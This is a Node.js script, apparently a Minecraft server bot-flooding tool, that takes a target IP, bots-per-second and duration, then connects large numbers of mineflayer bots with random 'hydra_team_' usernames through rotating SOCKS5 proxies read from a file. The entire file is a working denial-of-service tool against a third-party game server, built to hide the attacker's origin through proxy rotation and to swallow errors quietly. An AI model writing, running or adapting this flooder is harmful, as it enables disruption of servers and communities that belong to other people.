const fs = require('fs');
const path = require('path');
const { program } = require('commander');
const mineflayer = require('mineflayer');
const { SocksProxyAgent } = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');

const proxiesFile = path.resolve(__dirname, 'proxies.txt');
let proxies = [];

try {
  proxies = fs.readFileSync(proxiesFile, 'utf8').split('\n').map(line => line.trim()).filter(line => line);
} catch (err) {
  process.exit(1);
}

program
  .requiredOption('--ip <type>', 'IP address of the server')
  .requiredOption('--bps <type>', 'bots per second')
  .requiredOption('--time <type>', 'time in seconds')
  .requiredOption('--protocol <type>', 'protocol')
  .requiredOption('--method <type>', 'method');

program.parse(process.argv);

const options = program.opts();

const createProxyAgent = (proxy) => {
  const [proxyHost, proxyPort] = proxy.split(':');
  return new SocksProxyAgent(`socks5://${proxyHost}:${proxyPort}`);
};

const generateRandomName = () => {
  const lengths = [5];
  const randomLength = lengths[Math.floor(Math.random() * lengths.length)];
  return Math.random().toString(36).substring(2, 2 + randomLength);
};

const createBot = (proxyAgent) => {
  const botOptions = {
    host: options.ip,
    port: 25565,
    username: 'hydra_team_' + generateRandomName(),
    agent: proxyAgent,
  };

  const bot = mineflayer.createBot(botOptions);

  bot.on('spawn', () => {});
  bot.on('error', () => {});
  bot.on('end', () => {});

  return bot;
};

const sendRequests = () => {
  let proxyIndex = 0;
  const totalRequests = options.bps * options.time;
  const bots = [];

  for (let i = 0; i < totalRequests; i++) {
    const proxy = proxies[proxyIndex % proxies.length];
    const proxyAgent = createProxyAgent(proxy);
    
    if (proxyAgent) {
      const bot = createBot(proxyAgent);
      bots.push(bot);
    }

    proxyIndex++;
  }

  setTimeout(() => {
    bots.forEach(bot => bot.quit());
  }, options.time * 1000);
};

const startProxySpam = () => {
  sendRequests();
};

if (options.method === 'Requests') {
  startProxySpam();
} else {
  process.exit(1);
}
